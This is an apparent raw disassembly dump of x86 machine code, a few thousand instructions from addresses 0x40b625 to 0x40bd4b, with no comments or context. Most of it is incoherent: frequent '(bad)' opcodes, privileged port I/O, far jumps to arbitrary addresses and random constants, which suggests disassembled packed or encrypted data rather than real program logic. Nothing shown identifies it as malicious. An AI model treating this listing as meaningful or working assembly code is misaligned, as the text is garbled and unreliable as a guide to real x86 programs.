  40b625:	dec    edx
  40b626:	call   FWORD PTR [edx+ecx*4+0x52]
  40b62a:	dec    DWORD PTR [esi-0x7949cc76]
  40b630:	add    BYTE PTR [ebp+0x7589b54a],al
  40b636:	dec    edx
  40b637:	inc    DWORD PTR [ecx+0x6eff9369]
  40b63d:	jge    0x40b5d3
  40b63f:	fcomp  QWORD PTR [esi+0x65]
  40b642:	dec    edx
  40b643:	call   0xff8b6a71
  40b648:	push   esi
  40b649:	scas   eax,DWORD PTR es:[edi]
  40b64a:	pop    ecx
  40b64b:	test   DWORD PTR [esi+0x5d],0xa000754a
  40b652:	fidiv  WORD PTR [esi]
  40b654:	(bad)  
  40b655:	addr16 mov ch,0xfe
  40b658:	mov    ch,0x58
  40b65a:	mov    ebp,0x6cf0fffe
  40b65f:	mov    dh,0xff
  40b661:	push   edi
  40b662:	mov    ch,0x44
  40b664:	clc    
  40b665:	and    DWORD PTR [ebp+edi*8-0x1],eax
  40b669:	daa    
  40b66a:	mov    ch,0x74
  40b66c:	cld    
  40b66d:	xor    cl,cl
  40b66f:	mov    eax,ds:0xc1bf5800
  40b674:	or     BYTE PTR [eax-0x65],bl
  40b677:	mov    ch,ah
  40b679:	retf   
  40b67a:	or     esp,edi
  40b67c:	push   0x48
  40b67e:	pusha  
  40b67f:	or     edi,edi
  40b681:	in     eax,dx
  40b682:	dec    esp
  40b683:	out    0xb9,eax
  40b685:	stos   DWORD PTR es:[edi],eax
  40b686:	mov    dh,0xfe
  40b688:	mov    DWORD PTR ds:0xffc967b9,ecx
  40b68e:	inc    ebx
  40b68f:	(bad)  
  40b690:	(bad)  
  40b691:	ins    DWORD PTR es:[edi],dx
  40b692:	dec    ebp
  40b693:	out    0xf6,eax
  40b695:	add    ch,ah
  40b697:	mov    ch,0xfe
  40b699:	call   FWORD PTR [ebp-0x47]
  40b69c:	(bad)  
  40b69d:	jne    0x40b6af
  40b69f:	scas   al,BYTE PTR es:[edi]
  40b6a0:	jecxz  0x40b655
  40b6a2:	xlat   BYTE PTR ds:[ebx]
  40b6a3:	mov    ch,0xc8
  40b6a5:	ret    0x60c
  40b6a8:	push   ebp
  40b6a9:	mov    esi,DWORD PTR [ebx+eax*4-0x4a602f3c]
  40b6b0:	dec    BYTE PTR [ebp-0xb046e3]
  40b6b6:	fisttp QWORD PTR [ecx-0x2]
  40b6b9:	xor    eax,0x408d1e
  40b6be:	mov    al,0x3b
  40b6c0:	mov    eax,ds:0xbf4ad800
  40b6c5:	cmovge edi,ebx
  40b6c8:	add    DWORD PTR [eax],eax
  40b6ca:	xor    DWORD PTR [eax+0x4a],esp
  40b6cd:	inc    ebp
  40b6ce:	mov    ecx,0x3100035f
  40b6d3:	sbb    ecx,ecx
  40b6d5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6d7:	bound  eax,QWORD PTR [ebx]
  40b6d9:	add    BYTE PTR [ebx],cl
  40b6db:	pusha  
  40b6dc:	(bad)  
  40b6de:	or     BYTE PTR [eax-0x23],ah
  40b6e1:	(bad)  
  40b6e2:	mov    ebp,0xb450579c
  40b6e7:	in     al,0x57
  40b6e9:	idiv   DWORD PTR [esi-0xe]
  40b6ec:	mov    bl,0xfe
  40b6ee:	cld    
  40b6ef:	not    DWORD PTR [edx+0x75]
  40b6f2:	ins    DWORD PTR es:[edi],dx
  40b6f3:	idiv   DWORD PTR [esi-0x19fce5f]
  40b6f9:	mov    edi,0x5c5ce500
  40b6fe:	std    
  40b6ff:	xor    BYTE PTR [eax+0x3],ah
  40b702:	push   0xffc517a3
  40b707:	inc    edi
  40b708:	mov    ah,0xff
  40b70a:	out    0x9d,eax
  40b70c:	js     0x40b760
  40b70e:	jmp    FWORD PTR [edx+0x2585808f]
  40b714:	mov    BYTE PTR [edx-0x1],dl
  40b717:	and    DWORD PTR [esp+ebx*2],0x527fd8e1
  40b71e:	mov    DWORD PTR [edx+eax*4+0x1d0eff5a],ebp
  40b725:	add    al,0x68
  40b727:	dec    esp
  40b728:	retf   0xffc4
  40b72b:	jmp    ebp
  40b72d:	push   edx
  40b72e:	div    esi
  40b730:	xchg   edi,eax
  40b731:	push   edx
  40b732:	xor    eax,0xffc4faa7
  40b737:	into   
  40b738:	call   0xe487:0xa9deff8b
  40b73f:	fidiv  WORD PTR [edi+0x9316a51]
  40b745:	sar    ecx,1
  40b747:	pop    esi
  40b748:	retf   0x52e8
  40b74b:	test   BYTE PTR [ecx],bh
  40b74d:	pop    esi
  40b74e:	push   edx
  40b74f:	mov    dh,0x48
  40b751:	adc    al,0x9a
  40b753:	stc    
  40b754:	leave  
  40b755:	call   0x3ec232b5
  40b75a:	push   edx
  40b75b:	test   al,0x8e
  40b75d:	inc    ebp
  40b75e:	pop    edx
  40b75f:	add    BYTE PTR [esi+0x1903c348],dl
  40b765:	and    al,0xc1
  40b767:	les    eax,FWORD PTR [esi-0x79acabb9]
  40b76d:	dec    eax
  40b76e:	push   ss
  40b76f:	push   edx
  40b770:	cmp    al,0x7f
  40b772:	mov    eax,ds:0x55306ec4
  40b777:	mov    esp,DWORD PTR [esi+0x48]
  40b77a:	jo     0x40b704
  40b77c:	dec    ecx
  40b77d:	inc    eax
  40b77e:	not    BYTE PTR [ecx-0x35]
  40b781:	or     BYTE PTR [ecx-0x173616e5],al
  40b787:	push   eax
  40b788:	jl     0x40b7c3
  40b78a:	(bad)  
  40b78b:	push   ecx
  40b78c:	ds dec eax
  40b78e:	sbb    al,0x9a
  40b790:	jmp    0xbf9ca05e
  40b795:	add    dh,0x51
  40b798:	mov    eax,0x1e59c98d
  40b79d:	dec    eax
  40b79e:	fs xchg ebp,edi
  40b7a1:	aas    
  40b7a2:	scas   al,BYTE PTR es:[edi]
  40b7a3:	push   ecx
  40b7a4:	popa   
  40b7a5:	mov    cl,0xc8
  40b7a7:	stos   DWORD PTR es:[edi],eax
  40b7a8:	jno    0x40b7b3
  40b7aa:	sahf   
  40b7ab:	xchg   edi,eax
  40b7ac:	add    DWORD PTR [eax-0x6a],eax
  40b7af:	push   ecx
  40b7b0:	idiv   ch
  40b7b2:	push   esi
  40b7b3:	mov    esp,0xdd910971
  40b7b8:	sahf   
  40b7b9:	inc    edi
  40b7ba:	jle    0x40b7b9
  40b7bc:	sahf   
  40b7bd:	mov    esp,0x85adcfff
  40b7c2:	aam    0x76
  40b7c4:	add    BYTE PTR [eax+0x48],ah
  40b7c7:	add    al,0xdc
  40b7c9:	ret    0x3046
  40b7cc:	outs   dx,BYTE PTR ds:[esi]
  40b7cd:	mov    dh,0x64
  40b7cf:	not    DWORD PTR [esi+0x60]
  40b7d2:	(bad)  
  40b7d4:	adc    esi,eax
  40b7d6:	inc    edi
  40b7d7:	call   DWORD PTR [edx-0x57]
  40b7da:	adc    al,al
  40b7dc:	mov    ch,0x28
  40b7de:	(bad)  
  40b7e0:	add    eax,0x26ff47be
  40b7e5:	mov    dh,0x64
  40b7e7:	mul    DWORD PTR [esi]
  40b7e9:	loopne 0x40b808
  40b7eb:	add    cl,ch
  40b7ed:	xor    dl,BYTE PTR [esi+0x47d83985]
  40b7f3:	(bad)  
  40b7f4:	mov    ecx,0xa857f48a
  40b7f9:	xor    cl,BYTE PTR [eax-0x4b]
  40b7fc:	stc    
  40b7fd:	stc    
  40b7fe:	inc    edi
  40b7ff:	push   esi
  40b801:	aas    
  40b802:	jg     0x40b84c
  40b804:	test   al,0x32
  40b806:	xor    DWORD PTR ds:0x8947e1a1,ebx
  40b80c:	or     al,BYTE PTR fs:[eax-0x1]
  40b810:	(bad)  
  40b811:	lods   eax,DWORD PTR ds:[esi]
  40b812:	test   esp,esp
  40b814:	(bad)  
  40b815:	add    DWORD PTR [esi+0x0],0xa2aef6
  40b81c:	jmp    0xc5fe4253
  40b821:	jns    0x40b869
  40b823:	(bad)  
  40b824:	jmp    0xe9cf455a
  40b829:	add    BYTE PTR [edx],dh
  40b82b:	or     DWORD PTR [ebx-0xc1a5a4],eax
  40b831:	xchg   esi,eax
  40b832:	xor    dl,BYTE PTR [esi]
  40b834:	test   BYTE PTR [eax+0x32],ch
  40b837:	or     DWORD PTR [eax],eax
  40b839:	add    BYTE PTR [eax+0x3d],al
  40b83c:	(bad)  
  40b83d:	out    dx,al
  40b83e:	push   ds
  40b83f:	fnstenv [eax+ecx*1-0x50]
  40b843:	push   esi
  40b844:	mov    al,0xff
  40b846:	pop    edi
  40b847:	fnstenv [esp+ebp*8-0x12699]
  40b84e:	in     eax,0x42
  40b850:	out    0xd0,eax
  40b852:	cdq    
  40b853:	fsin   
  40b855:	inc    ebp
  40b857:	loop   0x40b84f
  40b859:	(bad)  
  40b85a:	out    dx,eax
  40b85b:	fdiv   DWORD PTR [eax+ecx*1+0x0]
  40b85f:	int3   
  40b860:	mov    al,0xff
  40b862:	pop    edi
  40b863:	fnstenv [esp+eiz*8-0x126b9]
  40b86a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b86b:	inc    edx
  40b86c:	out    0xb4,eax
  40b86e:	(bad)  
  40b870:	(bad)  
  40b871:	call   ebp
  40b873:	cmc    
  40b874:	idiv   bh
  40b876:	aas    
  40b877:	fnstenv [eax+ecx*1+0x40]
  40b87b:	dec    esi
  40b87c:	mov    al,0xff
  40b87e:	pop    edi
  40b87f:	(bad)  
  40b880:	mov    ah,0xe0
  40b882:	push   edi
  40b883:	(bad)  
  40b884:	(bad)  
  40b885:	inc    ebp
  40b887:	inc    ecx
  40b888:	out    0x98,eax
  40b88a:	test   eax,0x83fed6
  40b88f:	popf   
  40b890:	cmc    
  40b891:	idiv   bh
  40b893:	pop    edi
  40b894:	or     eax,0x989b1b74
  40b899:	shl    bh,1
  40b89b:	out    dx,eax
  40b89c:	aad    0x3
  40b89e:	jne    0x40b89a
  40b8a0:	ret    0xd884
  40b8a3:	xlat   BYTE PTR ds:[ebx]
  40b8a4:	aad    0xfe
  40b8a6:	dec    DWORD PTR [eax]
  40b8a8:	xlat   BYTE PTR ds:[ebx]
  40b8a9:	je     0x40b8b3
  40b8ab:	mov    al,ds:0x9fffb040
  40b8b0:	loope  0x40b8bb
  40b8b2:	push   0x31
  40b8b4:	xor    BYTE PTR [esi+0x75],cl
  40b8b7:	cmp    DWORD PTR [eax-0x71194f04],ecx
  40b8bd:	dec    edi
  40b8be:	mov    ch,0xd5
  40b8c0:	mov    esi,0xebc9ff4e
  40b8c5:	xchg   edi,eax
  40b8c6:	dec    esi
  40b8c8:	mov    dh,0x98
  40b8ca:	in     al,dx
  40b8cb:	mov    esi,0x70e84eae
  40b8d0:	pushf  
  40b8d1:	dec    edi
  40b8d2:	push   DWORD PTR [esi-0x5108a35c]
  40b8d8:	(bad)  
  40b8d9:	pop    ebx
  40b8da:	ss (bad) 
  40b8dd:	dec    esi
  40b8de:	jmp    esp
  40b8e0:	iret   
  40b8e1:	push   esi
  40b8e2:	call   DWORD PTR [esi-0x714be539]
  40b8e8:	test   BYTE PTR [esi-0x4b],0x69
  40b8ec:	es dec edi
  40b8ee:	dec    DWORD PTR [ecx+0xff974f]
  40b8f4:	jbe    0x40b914
  40b8f6:	cdq    
  40b8f7:	lock pushw ss
  40b8fa:	dec    edi
  40b8fb:	call   0xff8fbd3c
  40b900:	pop    esi
  40b901:	ins    BYTE PTR es:[edi],dx
  40b902:	dec    ebx
  40b903:	jmp    0xff8ef584
  40b908:	dec    esi
  40b909:	mov    esp,0x9000e84e
  40b90e:	add    eax,DWORD PTR [eax]
  40b910:	push   0xddfffb71
  40b915:	stos   BYTE PTR es:[edi],al
  40b916:	pop    esi
  40b917:	xor    ebp,0x56
  40b91a:	fcos   
  40b91c:	cwde   
  40b91d:	cmp    eax,0x5a29754e
  40b922:	es mov cl,0x16
  40b925:	jl     0x40b9a3
  40b927:	inc    ebp
  40b928:	or     eax,0x705756cb
  40b92d:	or     ecx,ebp
  40b92f:	dec    esi
  40b930:	test   BYTE PTR [ecx],dl
  40b932:	xchg   ecx,eax
  40b933:	shl    ch,1
  40b935:	inc    esp
  40b936:	xchg   esi,eax
  40b937:	dec    esi
  40b938:	fs inc ebp
  40b93a:	mov    ds,eax
  40b93c:	xor    DWORD PTR cs:[ebx],ebx
  40b93f:	xchg   ebp,eax
  40b940:	fiadd  WORD PTR [eax+esi*4+0x41]
  40b944:	sub    eax,0xdd7b1c09
  40b949:	mov    ah,BYTE PTR [ebp+0x6644be3f]
  40b94f:	xor    BYTE PTR [ebp+eax*2-0x47],0x4e
  40b954:	cmp    al,0x15
  40b956:	push   esi
  40b957:	sbb    BYTE PTR [eax],al
  40b959:	out    0xd1,eax
  40b95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b95c:	add    ebx,DWORD PTR [ecx+0x3103662c]
  40b962:	adc    BYTE PTR [ecx],ch
  40b964:	(bad)  
  40b965:	lods   eax,DWORD PTR ds:[esi]
  40b966:	in     al,0xea
  40b968:	add    esi,DWORD PTR [ecx]
  40b96a:	dec    esp
  40b96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b96c:	dec    ebx
  40b96d:	xor    DWORD PTR [ecx],ecx
  40b96f:	jmp    0x150f2f77
  40b974:	dec    esi
  40b975:	cs or  ecx,ebp
  40b978:	fldcw  WORD PTR [esi-0x4e]
  40b97b:	call   0xe8f32059
  40b980:	xor    ah,0x3c
  40b983:	cdq    
  40b984:	sub    BYTE PTR [ebp+edi*1-0x26b1b202],0xed
  40b98c:	xlat   BYTE PTR ds:[ebx]
  40b98d:	ds inc esp
  40b98f:	pop    esp
  40b990:	push   eax
  40b991:	dec    ecx
  40b992:	cmp    BYTE PTR [esi+0x4],0x31
  40b996:	adc    BYTE PTR [ecx+0xb3235d8],ch
  40b99c:	add    dh,BYTE PTR [ecx]
  40b99e:	or     DWORD PTR [ecx+0x72],edx
  40b9a1:	imul   ecx,edx,0x159c4ce8
  40b9a7:	add    cl,al
  40b9a9:	or     edi,DWORD PTR [ebx-0x1]
  40b9ac:	scas   al,BYTE PTR es:[edi]
  40b9ad:	mov    BYTE PTR [ecx-0x73],bl
  40b9b0:	ins    BYTE PTR es:[edi],dx
  40b9b1:	pop    ecx
  40b9b2:	cmp    al,0xff
  40b9b4:	sahf   
  40b9b5:	mov    ebp,0xc426e7d9
  40b9ba:	inc    ebx
  40b9bb:	jmp    DWORD PTR [eax+0x0]
  40b9be:	scas   al,BYTE PTR es:[edi]
  40b9bf:	cmp    bh,dh
  40b9c1:	xchg   BYTE PTR [esi+edx*4-0x7b],ch
  40b9c5:	lods   eax,DWORD PTR ds:[esi]
  40b9c6:	jl     0x40ba0c
  40b9c8:	call   FWORD PTR [ecx]
  40b9ca:	in     eax,dx
  40b9cb:	jb     0x40ba25
  40b9cd:	sub    BYTE PTR ds:0x6459b544,ch
  40b9d3:	inc    esp
  40b9d4:	call   FWORD PTR [esi+0x1e]
  40b9d7:	jnp    0x40ba21
  40b9d9:	test   al,0x32
  40b9db:	xor    DWORD PTR [ecx-0x69],edx
  40b9de:	hlt    
  40b9df:	inc    ebx
  40b9e0:	mov    DWORD PTR [ecx+ecx*1+0x3c],ebp
  40b9e4:	(bad)  
  40b9e5:	ds jnp 0x40ba2b
  40b9e8:	addr16 sub al,0xdd
  40b9eb:	enter  0x2dff,0x9e
  40b9ef:	cmp    bh,dh
  40b9f1:	es in  al,dx
  40b9f3:	inc    ebx
  40b9f4:	xor    eax,0xffc8b557
  40b9f9:	add    BYTE PTR [eax+0x7b],al
  40b9fc:	dec    DWORD PTR [esi]
  40b9fe:	jmp    0x6a43:0xedfeec8d
  40ba05:	jmp    0xa8990b84
  40ba0a:	xor    al,BYTE PTR [ebp+esi*4-0x7]
  40ba0e:	fld    QWORD PTR [ebx-0x1]
  40ba11:	out    0x27,al
  40ba13:	jnp    0x40ba5d
  40ba15:	sub    BYTE PTR ds:0x7d9f1531,ch
  40ba1b:	inc    edx
  40ba1c:	mov    DWORD PTR [edx+ecx*4+0x3a],esp
  40ba20:	inc    DWORD PTR [eax]
  40ba22:	add    bh,dh
  40ba24:	pusha  
  40ba25:	jmp    DWORD PTR [edi-0x43]
  40ba28:	outs   dx,BYTE PTR ds:[esi]
  40ba29:	inc    eax
  40ba2a:	add    bh,al
  40ba2c:	fwait
  40ba2d:	lock not edi
  40ba30:	aad    0xfe
  40ba32:	xor    eax,0x407e5e
  40ba37:	mov    al,ds:0xc7ffb4dd
  40ba3c:	mov    edi,0xd5bfe084
  40ba41:	dec    BYTE PTR [ebp-0x911b3]
  40ba47:	push   edi
  40ba48:	jbe    0x40bab1
  40ba4a:	shl    BYTE PTR [eax],1
  40ba4c:	inc    esi
  40ba4d:	(bad)  
  40ba4e:	(bad)  
  40ba4f:	std    
  40ba50:	aad    0xf6
  40ba52:	call   DWORD PTR [edi-0x2b]
  40ba55:	xor    al,0xb6
  40ba57:	add    BYTE PTR [edi-0x1],0xe7
  40ba5b:	ins    BYTE PTR es:[edi],dx
  40ba5c:	fwait
  40ba5d:	(bad)  
  40ba5e:	call   DWORD PTR [ebx+0xb1373c6]
  40ba64:	xchg   ebx,eax
  40ba65:	fdiv   st,st(7)
  40ba67:	push   edi
  40ba68:	aad    0x3
  40ba6a:	jne    0x40b9fe
  40ba6c:	aad    0x2f
  40ba6e:	(bad)  
  40ba6f:	or     eax,0x57fff6f2
  40ba74:	loope  0x40ba7f
  40ba76:	(bad)  
  40ba77:	or     eax,0x47fff6f2
  40ba7c:	cmp    edi,edi
  40ba7e:	call   FWORD PTR [eax+0x76]
  40ba81:	out    0x95,eax
  40ba83:	sbb    dl,ch
  40ba85:	dec    BYTE PTR [ebp-0x90a3300]
  40ba8b:	inc    DWORD PTR [edi+0x77]
  40ba8e:	addr16 mov eax,0xfeff47a0
  40ba94:	popf   
  40ba95:	(bad)  
  40ba97:	call   DWORD PTR [edi-0x32]
  40ba9a:	xor    al,0xb6
  40ba9c:	xor    eax,ebp
  40ba9e:	(bad)  
  40ba9f:	dec    DWORD PTR [esi]
  40baa1:	rcl    BYTE PTR [eax+0x43371eff],0x74
  40baa8:	inc    edx
  40baa9:	scas   eax,DWORD PTR es:[edi]
  40baaa:	mov    al,dl
  40baac:	push   es
  40baad:	jnp    0x40bafa
  40baaf:	add    al,0x7c
  40bab1:	es dec edx
  40bab3:	xor    BYTE PTR [esi-0x908d04c],ch
  40bab9:	mov    ds:0xb4f60a5f,al
  40babe:	das    
  40babf:	mul    esi
  40bac1:	xchg   edx,eax
  40bac2:	add    al,0x0
  40bac4:	xor    DWORD PTR [eax],esi
  40bac6:	mov    bl,0xe7
  40bac8:	cmp    dh,0x4a
  40bacb:	push   DWORD PTR [edx-0x3908a004]
  40bad1:	mov    dl,0x3
  40bad3:	je     0x40bad3
  40bad5:	scas   al,BYTE PTR es:[edi]
  40bad6:	mov    ah,dl
  40bad8:	mov    esi,0x24024ae2
  40badd:	and    bl,dh
  40badf:	push   DWORD PTR [ebp-0x6108c854]
  40bae5:	retf   0xfeb3
  40bae8:	fmul   st(3),st
  40baea:	push   edx
  40baeb:	inc    DWORD PTR [eax]
  40baed:	mov    es,edi
  40baef:	fild   DWORD PTR [esi+0x5bffef2]
  40baf6:	cmp    DWORD PTR [esi+0x4b1a65bd],eax
  40bafc:	push   DWORD PTR [ecx]
  40bafe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baff:	lock (bad) 
  40bb01:	pushf  
  40bb02:	or     edx,DWORD PTR [ebx-0x1]
  40bb05:	pop    esi
  40bb06:	pop    ss
  40bb07:	div    DWORD PTR [ecx-0x7abdbdaa]
  40bb0d:	push   ebp
  40bb0e:	inc    edx
  40bb0f:	dec    edx
  40bb10:	push   DWORD PTR [ecx]
  40bb12:	xor    BYTE PTR [ebx],al
  40bb14:	add    BYTE PTR [edx+0x3e5fa408],dh
  40bb1a:	inc    ecx
  40bb1b:	fiadd  WORD PTR [ebx]
  40bb1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb1e:	mov    ah,0x69
  40bb20:	mov    BYTE PTR ds:0x314ace39,dl
  40bb26:	mov    ch,0x4a
  40bb28:	xchg   esp,edx
  40bb2a:	xor    DWORD PTR [esi+0x3d0a0e4a],esi
  40bb30:	lods   eax,DWORD PTR ds:[esi]
  40bb31:	mov    cs,WORD PTR [ebx]
  40bb33:	jmp    0x1c817a92
  40bb38:	cld    
  40bb39:	push   cs
  40bb3a:	pushf  
  40bb3b:	dec    edi
  40bb3c:	dec    edx
  40bb3d:	out    dx,al
  40bb3e:	inc    eax
  40bb3f:	pop    esp
  40bb40:	push   edi
  40bb41:	fiadd  WORD PTR [eax-0x72]
  40bb44:	dec    edx
  40bb45:	adc    DWORD PTR fs:[ecx+0x7e408761],edx
  40bb4c:	dec    edx
  40bb4d:	test   BYTE PTR [ecx],dh
  40bb4f:	jle    0x40bb9b
  40bb51:	add    dh,al
  40bb53:	inc    eax
  40bb54:	hlt    
  40bb55:	sti    
  40bb56:	(bad)  
  40bb57:	popa   
  40bb58:	xchg   edi,eax
  40bb59:	dec    edx
  40bb5a:	mov    dh,0x40
  40bb5c:	xchg   esp,eax
  40bb5d:	aaa    
  40bb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb5f:	inc    eax
  40bb60:	push   esi
  40bb61:	dec    edx
  40bb62:	fsub   QWORD PTR ds:0x409e4a56
  40bb68:	mov    esp,0x8fa18efb
  40bb6d:	dec    edx
  40bb6e:	mov    es,WORD PTR [eax+0x7c]
  40bb71:	daa    
  40bb72:	jle    0x40bbb4
  40bb74:	cs dec edx
  40bb76:	add    al,0x11
  40bb78:	adc    DWORD PTR [edi+0x4a1e40c4],ebp
  40bb7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb7f:	sub    DWORD PTR [esi],ebx
  40bb81:	dec    edx
  40bb82:	inc    ax
  40bb84:	xchg   esp,eax
  40bb85:	sti    
  40bb86:	push   esi
  40bb87:	jno    0x40bbe0
  40bb89:	dec    edx
  40bb8a:	push   esi
  40bb8b:	inc    eax
  40bb8c:	xor    al,0x5f
  40bb8e:	inc    esi
  40bb8f:	inc    eax
  40bb90:	add    dh,dh
  40bb92:	jmp    0x40bb26
  40bb94:	mov    cl,0xee
  40bb96:	call   0xe11670da
  40bb9b:	aas    
  40bb9c:	call   ecx
  40bb9e:	clc    
  40bb9f:	js     0x40bba0
  40bba1:	(bad)  
  40bba2:	js     0x40bc1a
  40bba4:	call   0xe881247f
  40bba9:	cmp    eax,0xbeff3fc2
  40bbae:	mov    esi,0x78b6f728
  40bbb3:	xor    DWORD PTR [ecx+0x78],ebp
  40bbb6:	add    BYTE PTR [eax+0x40],ch
  40bbb9:	call   FWORD PTR [ebp+ebx*2+0x38]
  40bbbd:	call   FWORD PTR [esi-0x694f2073]
  40bbc3:	js     0x40bc05
  40bbc5:	inc    ebp
  40bbc6:	xchg   ecx,eax
  40bbc7:	jp     0x40bc42
  40bbc9:	std    
  40bbca:	xchg   BYTE PTR [eax+0x40],ch
  40bbcd:	jne    0x40bc4c
  40bbcf:	ins    DWORD PTR es:[edi],dx
  40bbd0:	ret    
  40bbd1:	pushf  
  40bbd2:	jmp    0xe2030e09
  40bbd7:	xor    dl,dh
  40bbd9:	mov    dl,BYTE PTR [ebp-0x54]
  40bbdc:	inc    esp
  40bbdd:	hlt    
  40bbde:	shl    DWORD PTR [edx],cl
  40bbe0:	mov    bl,0xd
  40bbe2:	push   esi
  40bbe3:	jbe    0x40bbec
  40bbe5:	call   0xff8074c3
  40bbea:	jo     0x40bbc2
  40bbec:	inc    ebx
  40bbed:	push   0xbe3032e9
  40bbf2:	shl    DWORD PTR [ebx],0xe1
  40bbf5:	inc    eax
  40bbf6:	jmp    0xa898b955
  40bbfb:	xor    al,BYTE PTR [eax+0x75]
  40bbfe:	icebp  
  40bbff:	or     ah,ah
  40bc01:	fst    DWORD PTR [esi]
  40bc03:	clc    
  40bc04:	lea    eax,[ebp+0x11]
  40bc07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc09:	xchg   DWORD PTR [eax],eax
  40bc0b:	nop
  40bc0c:	dec    edx
  40bc0d:	jmp    DWORD PTR [edi-0x64]
  40bc10:	jae    0x40bc52
  40bc12:	add    BYTE PTR [edi],bh
  40bc14:	push   cs
  40bc15:	mov    dh,0x48
  40bc17:	mov    DWORD PTR [ebx],ecx
  40bc19:	call   0xd0d4bc3b
  40bc1e:	dec    BYTE PTR [ebx]
  40bc20:	fmul   DWORD PTR [esi+0x25]
  40bc23:	mov    DWORD PTR [ebp-0x27],edx
  40bc26:	add    DWORD PTR [bx+si],ecx
  40bc29:	loop   0x40bbe8
  40bc2b:	call   DWORD PTR [ebp+0x3d]
  40bc2e:	out    0xa2,eax
  40bc30:	mov    ebp,0x45fffed1
  40bc35:	int    0xfe
  40bc37:	jne    0x40bbfd
  40bc39:	shl    DWORD PTR [eax+ecx*1-0x60],1
  40bc3d:	cld    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	dec    edi
  40bc41:	shl    DWORD PTR [esp+esi*8-0x50],1
  40bc45:	in     eax,dx
  40bc46:	scas   eax,DWORD PTR es:[edi]
  40bc47:	jmp    FWORD PTR [edi+0x9588f62]
  40bc4d:	add    eax,0xe2c075ff
  40bc52:	std    
  40bc53:	cld    
  40bc54:	aas    
  40bc55:	sar    esi,1
  40bc57:	jne    0x40bca5
  40bc59:	shl    DWORD PTR [eax+ecx*1+0x60],1
  40bc5d:	dec    ebx
  40bc5e:	lods   eax,DWORD PTR ds:[esi]
  40bc5f:	dec    DWORD PTR [edi]
  40bc61:	add    eax,edx
  40bc63:	add    al,0x98
  40bc65:	outs   dx,DWORD PTR ds:[esi]
  40bc66:	mov    ch,ah
  40bc68:	or     edi,esi
  40bc6a:	sti    
  40bc6b:	push   0xffffff88
  40bc6d:	pop    esp
  40bc6e:	push   cs
  40bc6f:	inc    ebp
  40bc71:	inc    edx
  40bc72:	out    0xe5,eax
  40bc74:	lods   eax,DWORD PTR ds:[esi]
  40bc75:	sar    esi,1
  40bc77:	mov    ebp,edx
  40bc79:	(bad)  
  40bc7a:	add    BYTE PTR [bx+si-0x421f],cl
  40bc7f:	push   0x40723900
  40bc84:	add    BYTE PTR [ecx],dh
  40bc86:	mov    BYTE PTR [esi+0x58],dl
  40bc89:	lock das 
  40bc8b:	dec    eax
  40bc8c:	jne    0x40bcb7
  40bc8e:	sbb    BYTE PTR [ebx],dh
  40bc90:	(bad)  [esi+0x3f]
  40bc93:	inc    edi
  40bc94:	jne    0x40bcdb
  40bc96:	aaa    
  40bc97:	int    0x7
  40bc99:	dec    ecx
  40bc9a:	es cdq 
  40bc9c:	push   DWORD PTR [esi]
  40bc9e:	jns    0x40bce2
  40bca0:	add    al,0x31
  40bca2:	cmc    
  40bca3:	jp     0x40bc91
  40bca5:	mov    dl,0x6b
  40bca7:	dec    eax
  40bca8:	push   0x31
  40bcaa:	retf   0xfef3
  40bcad:	pushf  
  40bcae:	cmp    BYTE PTR [ebx-0x56],bl
  40bcb1:	fdivr  QWORD PTR [esi+0x47]
  40bcb4:	mov    DWORD PTR [esp+esi*2-0x24],ebp
  40bcb8:	(bad)  
  40bcb9:	(bad)  
  40bcba:	jle    0x40bc42
  40bcbc:	push   0xffc4c7fe
  40bcc1:	push   esi
  40bcc2:	pushf  
  40bcc3:	lods   al,BYTE PTR ds:[esi]
  40bcc4:	inc    eax
  40bcc5:	xor    DWORD PTR [edi-0x4b36f82f],edx
  40bccb:	sub    al,0xff
  40bccd:	(bad)  
  40bcce:	sbb    DWORD PTR [eax+ebp*2],eax
  40bcd1:	or     cl,ch
  40bcd3:	(bad)  
  40bcd4:	dec    DWORD PTR [esi+0x57]
  40bcd7:	lods   al,BYTE PTR ds:[esi]
  40bcd8:	inc    eax
  40bcd9:	xor    DWORD PTR [edi+0x7169b610],ebp
  40bcdf:	add    ebp,eax
  40bce1:	or     BYTE PTR [ebx+0x3a00ff47],ah
  40bce7:	lock iret 
  40bce9:	and    ecx,DWORD PTR [ecx]
  40bceb:	xor    eax,0xa03140ac
  40bcf0:	pop    ebx
  40bcf1:	and    eax,0x5046fec5
  40bcf6:	sbb    DWORD PTR [eax],esi
  40bcf8:	add    ebp,edi
  40bcfa:	mov    edi,0xf0584e47
  40bcff:	or     cl,ch
  40bd01:	mov    bl,0x6f
  40bd03:	mov    bl,0xf0
  40bd05:	pop    ebx
  40bd06:	inc    ecx
  40bd07:	pusha  
  40bd08:	push   ss
  40bd09:	inc    edi
  40bd0a:	dec    ecx
  40bd0b:	pop    ds
  40bd0c:	pop    ecx
  40bd0d:	inc    edi
  40bd0e:	push   esi
  40bd0f:	cmp    eax,0xb34e477c
  40bd14:	lock pop ebx
  40bd16:	mov    ch,0x6b
  40bd18:	test   BYTE PTR [esi+0x68],0x4a
  40bd1c:	in     eax,0x3
  40bd1e:	fcom   QWORD PTR [ecx+0x3df582d5]
  40bd24:	aaa    
  40bd25:	scas   eax,DWORD PTR es:[edi]
  40bd26:	cwde   
  40bd27:	or     DWORD PTR [ebx-0xb],eax
  40bd2a:	pop    ds
  40bd2b:	mov    bh,0xe0
  40bd2d:	pop    ebx
  40bd2e:	inc    edi
  40bd2f:	outs   dx,BYTE PTR ds:[esi]
  40bd30:	mov    BYTE PTR [esi-0x48],0xc6
  40bd34:	mov    esp,0x20ff3c7a
  40bd39:	(bad)  
  40bd3c:	in     al,dx
  40bd3d:	add    eax,0x83e8ca69
  40bd42:	or     DWORD PTR cs:0x2fc64ebb,edx
  40bd49:	lds    eax,FWORD PTR [eax]
  40bd4b:	(bad)  
